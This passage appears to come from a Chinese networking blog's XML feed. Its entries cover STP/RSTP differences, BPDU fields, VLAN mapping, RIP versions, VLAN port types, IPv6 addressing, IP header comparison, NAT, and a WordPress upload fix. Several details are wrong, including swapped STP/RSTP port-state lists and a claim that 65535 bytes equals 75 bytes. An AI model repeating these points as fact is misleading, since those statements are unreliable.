        <content type="html"><![CDATA[<p><strong>一，端口角色不同：</strong></p><p>STP有是那种端口角色：Root Port , Destinaged Port, Alternate Port.</p><p>RSTP在STP的基础上增加了两种端口角色：Backup Port ,Edge Port.</p><p>在RSTP中Alternate Port是用来备份根端口的，Backup Port是用来备份指定端口的。Edge Port是RSTP中独有的一种端口角色。</p><p><strong>二，端口状态不同：</strong></p><p>STP中的端口状态有五种：discarding   blocking  listering  learning   forwarding</p><img src="https://i.loli.net/2018/03/26/5ab8f5143f608.png" alt="stpduankouzhuangtai.png" title="stpduankouzhuangtai.png" /><p>RSTP端口状态有三种：disabled   learning  forwarding</p><img src="https://i.loli.net/2018/03/26/5ab8f53301bed.png" alt="rstpduankouzhuangtai.png" title="rstpduankouzhuangtai.png" /><p><strong>三，拓扑收敛方式不同：</strong></p><p><strong>STP的拓扑收敛方式：</strong></p><ol><li>在网络拓扑发生变化后，下游设备会不间断地向上游设备发送TCN BPDU报文。</li><li>上游设备收到下游设备发来的TCN BPDU报文后，只有指定端口处理TCN BPDU报文。其它端口也有可能收到TCN BPDU报文，但不会处理。</li><li>上游设备会把配置BPDU报文中的Flags的TCA位设置1，然后发送给下游设备，告知下游设备停止发送TCN BPDU报文。</li><li>上游设备复制一份TCN BPDU报文，向根桥方向发送。</li><li>重复步骤1、2、3、4，直到根桥收到TCN BPDU报文。</li><li>根桥把配置BPDU报文中的Flags的TC位置1后发送，通知下游设备直接删除桥MAC地址表项。</li></ol><p><strong>RSTP的拓扑收敛方式：</strong></p><p>引入三种机制快速收敛：</p><ul><li>Proposal/Agreement机制<br>当一个端口被选举成为指定端口之后，在STP中，该端口至少要等待一个Forward Delay（Learning）时间才会迁移到Forwarding状态。而在RSTP中，此端口会先进入Discarding状态，再通过Proposal/Agreement机制快速进入Forward状态。这种机制必须在点到点全双工链路上使用。</li><li>根端口快速切换机制<br>如果网络中一个根端口失效，那么网络中最优的Alternate端口将成为根端口，进入Forwarding状态。因为通过这个Alternate端口连接的网段上必然有个指定端口可以通往根桥。</li><li>边缘端口的引入<br>在RSTP里面，如果某一个指定端口位于整个网络的边缘，即不再与其他交换设备连接，而是直接与终端设备直连，这种端口叫做边缘端口。<br>边缘端口不接收处理配置BPDU，不参与RSTP运算，可以由Disable直接转到Forwarding状态，且不经历时延，就像在端口上将STP禁用。但是一旦边缘端口收到配置BPDU，就丧失了边缘端口属性，成为普通STP端口，并重新进行生成树计算，从而引起网络震荡。</li></ul><p><strong>RSTP拓扑变化处理</strong></p><p>在RSTP中检测拓扑是否发生变化只有一个标准：一个非边缘端口迁移到Forwarding状态。</p><p>一旦检测到拓扑发生变化，将进行如下处理：</p><ul><li>为本交换设备的所有非边缘指定端口启动一个TC While Timer，该计时器值是Hello Time的两倍。<br>在这个时间内，清空状态发生变化的端口上学习到的MAC地址。<br>同时，由这些端口向外发送RST BPDU，其中TC置位。一旦TC While Timer超时，则停止发送RST BPDU。</li><li>其他交换设备接收到RST BPDU后，清空所有端口学习到MAC地址，除了收到RST BPDU的端口。然后也为自己所有的非边缘指定端口和根端口启动TC While Timer，重复上述过程。<br>如此，网络中就会产生RST BPDU的泛洪。</li></ul><p><strong>四，RSTP有各种保护机制，STP没有。</strong></p><img src="https://i.loli.net/2018/03/26/5ab8f600c715a.png" alt="20161219123131.png" title="20161219123131.png" /><p><strong>五，发送BPDU用到的flag位不同。</strong></p><p><strong>STP只用到了TC TCN TCA三个flag位：</strong></p><img src="https://i.loli.net/2018/03/26/5ab8f62499a79.png" alt="stpflag.png" title="stpflag.png" /><p><strong>RSTP用到了P位，A位，TC位，接口状态位，接口角色位</strong></p><p>配置BPDU格式的改变，充分利用了STP协议报文中的Flag字段，明确了端口角色。</p><p>在配置BPDU报文的格式上，除了保证和STP格式基本一致之外，RSTP作了一些小变化：</p><p>Type字段，配置BPDU类型不再是0而是2，所以运行STP的设备收到RSTP的配置BPDU时会丢弃。</p><p>Flag字段，使用了原来保留的中间6位，这样改变的配置BPDU叫做RST BPDU。</p><p><strong>RSTP flag:</strong></p><img src="https://i.loli.net/2018/03/26/5ab8f65128354.png" alt="rstpflag.png" title="rstpflag.png" />]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 二层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rstp </tag>
            
            <tag> stp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一张图详解STP配置BPDU</title>
      <link href="2016/12/18/one-img-STP-BPDU/"/>
      <url>2016/12/18/one-img-STP-BPDU/</url>
      
        <content type="html"><![CDATA[<p><img src="https://ws1.sinaimg.cn/large/eb8b3905gy1fhke1w1vr4j20gz0e8js2.jpg"></p><p>配置BPDU内容：</p><p><img src="https://ws1.sinaimg.cn/large/eb8b3905gy1fhkefmbvs5j20mi0eot9u.jpg"></p><p>最重要的四个参数：</p><ul><li><p>Root Identifier:发送此配置BPDU的交换机所认为的根交换机的交换机标识</p></li><li><p>Root Path Cost:从发送此配置BPDU的交换机到达根交换机的最短路径总开销，含交换机根端口的开销，不   含发送此配置BPDU的端口的开销</p></li><li><p>Bridge Identifier:发送此配置BPDU的交换机的交换机标识</p></li><li><p>Port Identifier:发送此配置BPDU的交换机端口的端口标识</p></li></ul><p>首先应该了解交换机在STP选举的过程中有两个参数：全局参数和端口参数。</p><p><img src="https://i.ooxx.ooo/2017/09/16/0a8519f2a03cd2db47137510bf04c7b1.png"></p><p><strong>全局参数</strong></p><p><img src="https://ws1.sinaimg.cn/large/eb8b3905gy1fhkf2hcky1j20d107ct97.jpg"></p><p><strong>端口参数</strong></p><p>端口参数是为全局参数服务的，最终的选举结果直观表现就为全局参数，当交换机收到一个配置BPDU后，首先将端口参数和BPDU中的参数作比较，如果收到的BPDU中的参数比自己的端口参数优，则改变端口参数。BPDU对比完毕，参数改变后开始计算根交换机，根端口，根路径开销。计算完毕后，对应改变交换机的全局参数，至此，每个交换机都知道谁是根桥，哪个端口是根端口以及根路径开销。这个过程计算完毕后，交换机将在非根端口中依据全局参数和端口参数计算指定端口，计算完毕后更新指定端口参数。</p><p>（备注：不仅交换机要知道谁是根桥谁是指定桥，每个端口也要知道）</p><p>根交换机、根端口和根路径开销计算过程：</p><p>1.根据所有的端口上记录的参数，依次比较Designated Root，Designated Cost和端口Cost之和，Designated Bridge和Designated Port，从中选出一个记录了最优参数的端口，并且此端口上记录的Designated Root要比交换机自身的Bridge Identifier（交换机标识）更优先，此端口即为根端口；<br>2.选择出此端口之后，更新交换机全局参数Designated Root为根端口记录的Designated Root；更新交换机全局参数Root Path Cost为根端口记录的Designated Cost与根端口的Port Cost之和；<br>3.如果任何端口记录的Designated Root参数都不比交换机自身的Bridge Identifier更优先，则交换机全局参数Designated Root设置为交换机自身的Bridge Identifier；交换机全局参数Root Path Cost设置为0。</p><p>确定一个端口可以成为指定端口之后，交换机需要修改指定端口的参数，修改规则如下：</p><p>Designated Root设置为交换机全局参数Designated Root；</p><p>Designated Cost设置为交换机全局参数Root Path Cost；</p><p>Designated Bridge设置为交换机自身的Bridge Identifier；</p><p>Designated Port设置为端口自身的Port Identifier。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 二层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BPDU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vlan mapping（vlan映射）详解</title>
      <link href="2016/12/17/vlan-mapping/"/>
      <url>2016/12/17/vlan-mapping/</url>
      
        <content type="html"><![CDATA[<p>VLAN Mapping主要部署在公网上的边缘节点设备，实现私网与公网的VLAN分离，节省公网的VLAN资源。</p><p>VLAN Mapping通过修改报文携带的VLAN Tag来实现不同VLAN的相互映射。</p><p>在某些场景中，两个VLAN相同的二层用户网络通过骨干网络互联，为了实现用户之间的二层互通，以及二层协议（例如MSTP等）的统一部署，需要实现两个用户网络的无缝连接，此时就需要骨干网可以传输来自用户网络的带有VLAN Tag的二层报文。</p><p>而在通常情况下，骨干网的VLAN规划和用户网络的VLAN规划是不一致的，所以在骨干网中无法直接传输用户网络的带有VLAN Tag的二层报文。</p><p>解决这个问题的方法有两个，其中一个是通过QinQ或者VPLS等二层隧道技术，将用户带有VLAN Tag的二层报文封装在骨干网报文中进行传输，可以实现用户带有VLAN Tag的二层报文的透传。</p><p><u>但是这种方法一方面需要增加额外的报文开销（增加一层封装），另外一方面，二层隧道技术可能会对某些二层协议报文的透传支持不是非常完善。</u></p><p>另外一种方法就是通过VLAN Mapping技术，一侧用户网络的带有VLAN Tag的二层报文进入骨干网后，骨干网边缘设备将用户网络的VLAN（C-VLAN）修改为骨干网中可以识别和承载的VLAN（S-VLAN），传输到另一侧之后，边缘设备再将S-VLAN修改为C-VLAN。这样就可以很好的实现两个用户网络二层无缝连接。</p><p>在另一种场景中，如果由于规划的差异，导致两个直接相连的二层网络中部署的VLAN ID不一致。但是用户又希望可以把两个网络作为单个二层网络进行统一管理，例如用户二层互通和二层协议的统一部署。此时也可以在连接两个网络的交换机上部署VLAN Mapping功能，实现两个网络之间不同VLAN ID的映射，达到二层互通和统一管理的目的。</p><p><strong>基本原理</strong></p><p>交换机收到数据报文后，根据是否带有Tag做以下两种处理：</p><p>1、数据报文带Tag，根据配置的VLAN Mapping方式，决定替换单层、双层或双层中的外层Tag；然后进入MAC地址学习阶段，根据源MAC地址+映射后的VLAN ID刷新MAC地址表项；根据目的MAC+映射后VLAN ID查找MAC地址表项，如果没有找到，则在VLAN ID对应的VLAN内广播，否则从表项对应的接口转发。</p><p>2、数据报文不带Tag，根据配置的VLAN划分方式决定是否添加VLAN Tag，对于不能加入VLAN的数据报文上送CPU或丢弃，否则添加Tag；然后进入MAC地址学习阶段，按照二层转发流程进行转发。</p><p>如下图1所示，当在接口Port1上配置了VLAN2和VLAN3映射后，接口在向外发送VLAN2的帧时，将帧中的VLAN Tag替换成VLAN3的VLAN Tag；在接收VLAN3的帧时，将帧中的VLAN Tag替换成VLAN2的VLAN Tag，然后按照二层转发流程进行数据转发，这样VLAN2和VLAN3就能实现互相通信。</p><img src="https://i.loli.net/2018/03/26/5ab8f44c36cc8.png" alt="2d551448512351.png" title="2d551448512351.png" /><p>此外，要想借助VLAN Mapping实现两个VLAN内设备互相通信，这两个VLAN内设备的IP地址还必须处于同一网段。如果两个VLAN内设备的IP地址不在同一网段，那么设备间的互通需要依赖三层路由实现，这样就失去了VLAN Mapping的意义。</p><p><strong>映射方式</strong></p><p>设备支持基于VLAN、802.1优先级和MQC（流策略）方式实现VLAN Mapping，其中基于VLAN的VLAN Mapping包括以下映射方式：</p><ul><li>1 to 1的映射方式</li></ul><p>当部署VLAN Mapping功能设备上的主接口收到带有单层VLAN Tag的报文时，将报文中携带的单层VLAN Tag映射为公网的VLAN Tag。包括1:1和N:1两种方式，其中1:1的方式是将指定的一个用户侧VLAN Tag标签映射到一个网络侧VLAN Tag标签，N:1的方式是将指定范围的多个用户侧VLAN Tag标签映射到一个网络侧VLAN Tag标签。</p><ul><li>2 to 1的映射方式</li></ul><p>当部署VLAN Mapping功能设备上的主接口收到带有双层VLAN Tag的报文时，将报文中携带的外层Tag映射为公网的Tag，内层Tag作为数据透传。</p><ul><li>2 to 2的映射方式</li></ul><p>当部署VLAN Mapping功能设备上的主接口收到带有双层VLAN Tag的报文时，将报文中携带的双层VLAN Tag映射为公网的双层VLAN Tag。</p><p>基于MQC实现VLAN Mapping指的是通过MQC可以对分类后的报文实现VLAN Mapping。</p><p>用户可以根据多种匹配规则对报文进行流分类，然后将流分类与VLAN Mapping的动作相关联，对匹配规则的报文重标记报文的VLAN ID值。基于MQC的VLAN Mapping能够针对业务类型提供差别服务。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 二层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vlan Mapping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RIPV1,RIPV2,RIPng三种协议对比</title>
      <link href="2016/12/16/RIPV1-RIPV2-RIPng-compare/"/>
      <url>2016/12/16/RIPV1-RIPV2-RIPng-compare/</url>
      
        <content type="html"><![CDATA[<h2 id="共有点："><a href="#共有点：" class="headerlink" title="共有点："></a>共有点：</h2><ol><li><p>都是距离矢量的路由协议（距离代表跳数，矢量代表方向），使用跳数作为度量来衡量到达目的网络的距离。</p></li><li><p>配置简单，易于维护，适合小型网络。</p></li><li><p>工作过程相同，也就是路由的交互过程相同：</p></li></ol><p>路由器运行RIP后，会首先发送路由更新请求，收到请求的路由器会发送自己的RIP路由进行响应。</p><p>网络稳定后，路由器会周期性发送路由更新信息。</p><ol start="4"><li>RIP度量值使用标准相同：</li></ol><p>RIP使用跳数作为度量值来衡量到达目的网络的距离。</p><p>缺省情况下，直连网络的路由跳数为0。当路由器发送路由更新时，会把度量值加1。RIP规定超过15跳为网络不可达。</p><ol start="5"><li><p>时间参数（定时器）相同：<br>周期通告路由信息的时间都为30秒，路由老化时间都为180秒，垃圾定时器都为120秒（response报文发送四次的时间）</p></li><li><p>承载协议相同：都是用UDP协议承载报文，但端口号不相同：RIPV1和RIPV2使用UDP端口号520，而RIPng使用UDP端口号521。</p></li></ol><h2 id="不同点："><a href="#不同点：" class="headerlink" title="不同点："></a>不同点：</h2><ol><li><p>使用场景不同：RIPV1和RIPV2用于IPV4的网络中，而RIPng用于IPV6网络中。</p></li><li><p>RIP报文发送的目的地址不同：RIPV1是以广播报文的方式发送，RIPV2目的地为组播地址：224.0.0.9，RIPng目的地为组播地址：ff02::9/8.</p></li><li><p>路由条目的下一跳地址不同：RIPV1和RIPv2路由条目的下一跳地址为全局私网或公网地址，RIPng路由条目的下一跳地址为0::0或者链路本地地址。</p></li></ol><p>（备注：IPv4路由协议一般采用全局公网地址或私网地址作为路由条目的下一跳地址，而IPv6路由协议通常采用链路本地地址作为路由条目的下一跳地址。）</p><ol start="4"><li><p>是否是无类路由协议：RIPv1是有类别路由协议，不支持VLSM和CIDR。RIPv2为无类别路由协议，支持VLSM，支持路由聚合与CIDR。在IPV6中由于地址格式的不同，有类和无类这一概念就不再使用，所以RIPng在这个点上不在作对比。但RIPng也支持ipv6路由聚合。</p></li><li><p>报文格式不同：</p></li></ol><p>RIPV1:</p><p><img src="https://i.loli.net/2018/03/26/5ab8f2abdcb08.png"></p><p><strong>备注</strong>：command代表此报文是一个RIP请求报文还是响应报文，1代表请求，2代表响应。</p><p>version表示版本，RIPV1为1，RIPV2和RIPng均为2.</p><p>Address Family Identifier（AFI）：表示地址标识信息，对于IP协议，其值为2。在RIPV2中这个字段还</p><p>具有认证功能。</p><p>RIPV2：</p><p><img src="https://i.loli.net/2018/03/26/5ab8f2abdb409.png"></p><p>RIPng：</p><p><img src="https://i.loli.net/2018/03/26/5ab8f2abdb409.png"></p><ol start="6"><li>安全认证不同：</li></ol><p>RIPV1不支持认证，RIPV2支持认证，RIPng本身不提供认证机制，依靠IPv6提供的安全机制（扩展报头）来保证自身报文的合法性。</p><ol start="7"><li>与网络层协议的兼容性不同：</li></ol><p>RIP不仅能在IP网络中运行，也能在IPX网络中运行；RIPng只能在IPv6网络中运行。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vlan端口类型总结</title>
      <link href="2016/12/16/Vlan-port-summary/"/>
      <url>2016/12/16/Vlan-port-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="ACCESS端口"><a href="#ACCESS端口" class="headerlink" title="ACCESS端口"></a>ACCESS端口</h2><p>收数据帧时 判断数据帧是否有标记:<br>有标记     和端口pvid相同收，否则丢弃<br>没有标记   打上端口的pvid接收</p><p>发数据帧时 判断发送的数据帧所带标记和端口的pvid是否相同<br>相同  去标记发送<br>不同  丢弃</p><h2 id="trunk端口"><a href="#trunk端口" class="headerlink" title="trunk端口"></a>trunk端口</h2><p>收数据帧时 判断数据帧是否有标记<br>有标记     接口配置pvid，经比较相同的话，剥掉标记。不同的话查看是否在允许列表中，在的话接收，不在，丢弃。接口没有配置pvid，查看允许列表。<br>没有标记   打上端口的pvid接收</p><p>发数据帧时 判断发送的数据帧所带标记和端口的pvid是否相同<br>相同  去标记发送。<br>不同  判断与允许通过的VLAN是否相同，相同的话发送，不同的话丢弃。</p><h2 id="hybird端口"><a href="#hybird端口" class="headerlink" title="hybird端口"></a>hybird端口</h2><p>收数据帧时 判断数据帧是否有标记<br>有标记     接收<br>没有标记   打上端口的pvid接收</p><p>发数据帧时<br>hybird端口规定的vlan是taggged属性的话 带上相应的标记发送<br>hybird端口规定的vlan是untaggged属性的话 发送数据帧时就去掉标记发送</p><p>Untagged和Tagged列表就是允许通过的vlan。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 二层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vlan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPV6地址分类以及IPV6获取地址四种方式比较</title>
      <link href="2016/12/13/IPV6-address-IPV6-get-address-method/"/>
      <url>2016/12/13/IPV6-address-IPV6-get-address-method/</url>
      
        <content type="html"><![CDATA[<h2 id="IPV6地址分类："><a href="#IPV6地址分类：" class="headerlink" title="IPV6地址分类："></a>IPV6地址分类：</h2><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190224223458.jpg"></p><p>IPv6 单播地址的类型可有多种，包括全球单播地址、链路本地地址和站点本地地址等。</p><ul><li><p>全球单播地址等同于 IPv4 公网地址，提供给网络服务提供商。这种类型的地址允许路由前缀的聚合，从而限制了全球路由表项的数量。</p></li><li><p>链路本地地址用于邻居发现协议和无状态自动配置中链路本地上节点之间的通信。使用链路本地地址作为源或目的地址的数据报文不会被转发到其他链路上。</p></li><li><p>站点本地地址与 IPv4 中的私有地址类似。使用站点本地地址作为源或目的地、址的数据报文不会被转发到本站点（相当于一个私有网络）外的其它站点。</p></li><li><p>环回地址：单播地址 0:0:0:0:0:0:0:1（简化表示为::1）称为环回地址，不能分配给任何物理接口。它的作用与在IPv4 中的环回地址相同，即节点用来给自己发送IPv6 报文。</p></li><li><p>未指定地址：地址“::”称为未指定地址，不能分配给任何节点。在节点获得有效的IPv6 地址之前，可在发送的IPv6 报文的源地址字段填入该地址，但不能作为IPv6 报文中的目的地址。</p></li></ul><h3 id="特殊IPV6组播地址："><a href="#特殊IPV6组播地址：" class="headerlink" title="特殊IPV6组播地址："></a>特殊IPV6组播地址：</h3><p><a href="http://blog.sina.com.cn/s/blog_8ff4e74b0106d0bh.html">http://blog.sina.com.cn/s/blog_8ff4e74b0106d0bh.html</a></p><p>注意：IPV6地址中没有了广播地址，广播地址的功能由组播地址来实现。</p><h2 id="IPV6地址获取的四种方式："><a href="#IPV6地址获取的四种方式：" class="headerlink" title="IPV6地址获取的四种方式："></a>IPV6地址获取的四种方式：</h2><p>1.手工配置：此方法配置和IPV4的配置方法相同，在IPV6中主要是一些重要的服务器或路由器接口等需要用此方法来配置。</p><p>2.无状态自动获取：此方法要借助ICMPv6报文来实现，具体过程如下：</p><p>  (1) 节点启动时，通过RS 消息向路由器发出请求，请求前缀和其他配置信息，以便用于节点的配置。</p><p>  (2) 路由器返回RA 消息，其中包括前缀信息选项（路由器也会周期性地发布RA消息）。</p><p>  (3) 节点利用路由器返回的RA 消息中的地址前缀及其他配置参数，自动配置接口的IPv6 地址及其他信息。</p><p>3.通过EUI-64来自动生成PV6地址：</p><p>目前IPv6 单播地址基本上都要求接口标识符为64 位。IEEE EUI-64 格式的接口标识符是从接口的链路层地址（MAC 地址）变化而来的。IPv6 地址中的接口标识符是64 位，而MAC地址是48 位，因此需要在MAC 地址的中间位置（从高位开始的第24 位后）插入十六进制数FFFE（1111111111111110）。为了确保这个从MAC 地址得到的接口标识符是唯一的，还要将Universal/Local (U/L)位（从高位开始的第7 位）设置为“1”。最后得到的这组数就作为EUI-64 格式的接口标识符。</p><p>4.通过DHCPV6来获取地址：此方法由DHCPV6服务器实现，具体过程请关注后续文章。</p><h2 id="比较："><a href="#比较：" class="headerlink" title="比较："></a>比较：</h2><p>手工配置方式较为简单，适用于个别地址的配置，无状态自动获取主要是ipv6网络中的主机通过此方式获取地址来访问互联网。EUI-64方式适用于路由器接口来自动生成link-local地址。</p><p>与其他 IPv6 地址分配方式（手工配置、通过路由器公告消息中的网络前缀无状态自动配置等）相比，DHCPv6 具有以下优点：</p><ul><li><p>不仅可以分配 IPv6 地址，还可以分配IPv6 前缀，便于全网络的自动配置和管理。</p></li><li><p>更好地控制地址的分配。通过DHCPv6 不仅可以记录为主机分配的地址/前缀，还可以为特定主机分配特定的地址/前缀，以便于网络管理。</p></li><li><p>除了 IPv6 前缀、IPv6 地址外，还可以为主机分配DNS 服务器、域名等网络配置参数。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> ipv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPV6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPV4报头和IPV6报头比较</title>
      <link href="2016/12/12/IPV4-IPV6-package-diff/"/>
      <url>2016/12/12/IPV4-IPV6-package-diff/</url>
      
        <content type="html"><![CDATA[<h2 id="IPV4报头分析"><a href="#IPV4报头分析" class="headerlink" title="IPV4报头分析:"></a><strong>IPV4报头分析:</strong></h2><p><img src="https://i.loli.net/2018/03/26/5ab8f18fe129f.png"></p><p>1.version:版本号，当前版本号为4即代表此报文为IPV4报文</p><p>2.header length：首部长度，表示当前iPv4报文头部长度。一般为20字节，此字段会根据后面的ip option选项的长度而变长，最长为60字节。</p><p>3.DS Field：此字段也叫作Type of Service (TOS)或DiffServ，用来给特殊的数据打标记，一般用来做QOS。</p><p>4.Total Length: 表示ipv4数据包的总长度，此字段长度为16 bit，因此用十进制表示最大为65535，也就是说IP数据包最大长度为65535字节即75字节。</p><p>5.Identification , Flags , Fragment Offect:这三个字段用于ipv4数据包的分片和重组，这里暂时不做讨论，后续文章会做详细讨论。</p><p>6.Timeto live:TTl值，用于ipv4数据报文的防环，此字段占8个比特，总长度为256，没经过一个路由器减一，当次字段为0时，路由器将丢弃此数据包。</p><p>7.Protocol:协议号，用于表示将要处理的上层协议类型。</p><p>8.Header Checksum:头部校验和，字段长度为16 bit。可以对于IP报头纠错，它不包括被封装的数据内容。由于这个字段与上层协议中这个功能有冗余之嫌，故在IPV6中取消了此字段。</p><p>9.Source ip Address ,Destionation IP Adress :源目ipv4地址，用于生成路由表，指导数据包的转发。</p><p>10.IP Options:可选字段可选且长度可变，但最长为40字节。此字段在实际中用得并不多。</p><h2 id="IPV6报头分析"><a href="#IPV6报头分析" class="headerlink" title="IPV6报头分析"></a>IPV6报头分析</h2><p><img src="https://i.loli.net/2018/03/26/5ab8f1aea6143.png"></p><p>1.version：版本号，和IPV4报头版本号意思相同，这里为6.</p><p>2.Traffic class:流类别，长度为8bit，它等同于IPv4报头中的TOS字段，表示IPv6数据报的类或优先级，主要应用于QoS。</p><p>3.Flow Lable：流标签，长度为20bit，它用于区分实时流量。流可以理解为特定应用或进程的来自某一源地址发往一个或多个目的地址的连续单播、组播或任播报文。IPv6中的流标签字段、源地址字段和目的地址字段一起为特定数据流指定了网络中的转发路径。（即三元组）而ipv4中区分一个特定的数据流需要五元组（源目IP，源目端口，协议）这样，报文在IP网络中传输时会保持原有的顺序，提高了处理效率。随着三网合一的发展趋势，IP网络不仅要求能够传输传统的数据报文，还需要能够传输语音、视频等报文。这种情况下，流标签字段的作用就显得更加重要。</p><p>4.Payload length:定义了负载的长度，数据包封装的字节数。</p><p>5.Next Header:下一个报头，长度为8bit。该字段定义了紧跟在IPv6报头后面的第一个扩展报头（如果存在）的类型，这个区域非常类似与ipv4包头中的协议字段，实际上使用的目的就是标识在下一头是一个上层协议的头（就是标识上层协议）。同ipv4这个区域类似，这个区域也是8个bit。 但是在ipv6中，在紧随在数据包头的不一定是上层协议的头（ipv4里面的数据包头后面跟的就是上层协议的头），有可能是扩展包头（再次出现这个名词，在下一段中描述）。 所以下一个头区域的命名具有很大范围的意义。</p><p>6.HOP Limit: 长度为8bit，该字段类似于IPv4报头中的Time to Live字段，它定义了IP数据报所能经过的最大跳数。每经过一个路由器，该数值减去1；当该字段的值为0时，数据报将被丢弃。</p><p>7.Source ip Address ,Destionation IP AdresS:源目ipv6地址。</p><h2 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h2><ol><li>版本号不同</li><li>pv6中没有了header length和Total length字段，增加了payload length字段。</li><li>IPV6没有了DS Filed这个字段，而用Taffic class代替。</li><li>IPV6增加了流标签字段用来标识特定的数据流，相比ipv4更加简化。</li><li>IPV6中去除了用来分片和重组的字段，而是将这个功能增加到了扩展包头中。</li><li>IPV6去除了协议字段，而用扩展报头来替代这一功能。<br>注意ipv6包头中取消了原来ipv4包头中的校验和区域。 现在的网络传输介质都增加了传输的可靠性（无线可能是一个特例），并且事实上上层协议常常使用自己的错误检测和修复机制，Ipv6包头中加入校验意义不打，所以就被将它剔除了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 三层协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IPV4 </tag>
            
            <tag> IPV6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NAT各种方式总结</title>
      <link href="2016/12/10/NAT-summary/"/>
      <url>2016/12/10/NAT-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="NAT简介："><a href="#NAT简介：" class="headerlink" title="NAT简介："></a>NAT简介：</h2><p>NAT（network address  translation）网络地址转换，主要用于实现位于内部网络的主机访问外部网络的功能。当局域网内的主机需要访问外部网络时，通过NAT技术可以将其私网地址转换为公网地址，并且多个私网用户可以共用一个公网地址，这样既可保证网络互通，又节省了公网地址。</p><p>NAT技术的出现原因主要是因为当前ipv4地址的耗尽，使用这个技术可以极大的减少公网地址的使用，另一种解决办法是ipv6技术（根本解决办法）。</p><p>我认为NAT技术的应用还可以隐藏内部网络的细节，一定程度上保护了内部网络。</p><h2 id="静态NAT："><a href="#静态NAT：" class="headerlink" title="静态NAT："></a>静态NAT：</h2><p>静态NAT是将私网地址和公网地址进行一对一的映射，即当用户访问一个私网地址时，路由器会将这个私网地址转换为对应的公网地址，从而访问公网。</p><p>静态NAT是最初的网络地址转换思想，无法解决ipv4地址不足的问题。</p><h2 id="动态NAT"><a href="#动态NAT" class="headerlink" title="动态NAT"></a>动态NAT</h2><p>动态NAT实现了私网地址和公网地址动态的映射。即我们可以定义一个公网地址池，当内部网络需要访问外网时，路由器可以随机的从公网地址池中取出一个公网ip和私网ip进行映射。当内部网络不需要访问外网时，这个地址会被回收进地址池，以供下一个主机进行映射。</p><p>动态NAT的方式更加灵活，但还是无法解决iPv4地址不足的问题，因为始终需要一个公网地址进行映射，有多少主机同时访问外网就需要多少公网ip进行映射。</p><h2 id="NAPT："><a href="#NAPT：" class="headerlink" title="NAPT："></a>NAPT：</h2><p>NAPT（network address port translation）网络地址端口转换，此方法才真正的解决了ipv4地址不足的问题。NAPT可以将多个私网地址映射到同一个公网地址的不同端口号。以端口号的不同来区分不同的映射。</p><p>Easy ip 其实是一种特殊的NAPT，easy ip使用网关连接公网的接口ip地址来和私网ip地址进行映射。</p><h2 id="NAT-SERVER："><a href="#NAT-SERVER：" class="headerlink" title="NAT SERVER："></a>NAT SERVER：</h2><p>NAT在使内网用户访问公网的同时，也屏蔽了公网用户访问私网主机的需求。当一个私网需要向公网用户提供Web和SFTP服务时，私网中的服务器必须随时可供公网用户访问。</p><p>NAT服务器可以实现这个需求，但是需要配置服务器私网IP地址和端口号转换为公网IP地址和端口号并发布出去。路由器在收到一个公网主机的请求报文后，根据报文的目的IP地址和端口号查询地址转换表项。路由器根据匹配的地址转换表项，将报文的目的IP地址和端口号转换成私网IP地址和端口号，并转发报文到私网中的服务器</p><p>静态NAPT和NATserver的原理相同，只不过在配置上有微小的区别，此种方式也可以实现外网访问内网服务的需求。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> NAT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NAT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress不支持上传带中文名文件解决办法</title>
      <link href="2016/12/09/slove-wordpress-can&#39;t-upload-chinese-name-file/"/>
      <url>2016/12/09/slove-wordpress-can&#39;t-upload-chinese-name-file/</url>
      
        <content type="html"><![CDATA[<p>WordPress目录下找到wp-admin/includes/file.php这个文件。在wp-admin/includes/file.php文件中查找</p><pre class="line-numbers language-none"><code class="language-none">$new_file &#x3D; $uploads[&#39;path&#39;] . &quot;&#x2F;$filename&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>替换成下面的:</p><pre class="line-numbers language-none"><code class="language-none">$new_file &#x3D; $uploads[&#39;path&#39;] . &quot;&#x2F;&quot;.date(&quot;YmdHis&quot;).floor(microtime()*1000).&quot;.&quot;.$ext;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以实现wordpress上传图片自动重命名了。</p><p>然后在编辑图片中改成你想要的中文名字就好，经测试这一方法比较好用，其他方法暂不可用。</p><img src="https://i.loli.net/2018/03/29/5abc820708feb.png" alt="20161209171455.png" title="20161209171455.png" />]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> bug解决 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为PPPoE相关配置</title>
      <link href="2016/12/08/huawei-PPPoE-config/"/>
      <url>2016/12/08/huawei-PPPoE-config/</url>
      
